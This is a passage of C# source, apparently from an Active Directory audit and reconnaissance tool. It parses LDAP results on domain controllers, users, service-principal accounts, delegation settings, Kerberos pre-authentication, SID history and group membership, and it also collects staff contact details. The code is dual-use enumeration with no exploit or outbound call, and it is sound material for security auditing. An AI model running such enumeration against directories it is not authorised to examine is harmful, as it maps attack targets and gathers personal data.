                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case "InfrastructureRole":
                                Infra = true;
                                break;
                                case "NamingRole":
                                Naming = true;
                                break;
                                case "SchemaRole":
                                Schema = true;
                                break;
                                case "RidRole":
                                RID = true;
                                break;
                                case "PdcRole":
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", Domain));
                    DCObj.Members.Add(new PSNoteProperty("Site", Site));
                    DCObj.Members.Add(new PSNoteProperty("Name", Convert.ToString(AdDC.Name).Split('.')[0]));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Properties["objectclass"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Properties["name"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Properties["whencreated"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Properties["whenchanged"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Properties["distinguishedname"][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = "";
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties["accountExpires"].Count != 0)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine("Exception caught: {0}", e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                        {
                            DelegationType = "Constrained";
                            for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                            {
                                var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                                DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties["serviceprincipalname"].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? CleanString(AdUser.Properties["canonicalname"][0]) : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    string PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (string SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    string ManagedBy = "";
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties["msDS-ReplValueMetaData"];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Properties["samaccountname"][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string ObjectClass = Convert.ToString(AdGroup.Properties["objectclass"][AdGroup.Properties["objectclass"].Count-1]);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberName = null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
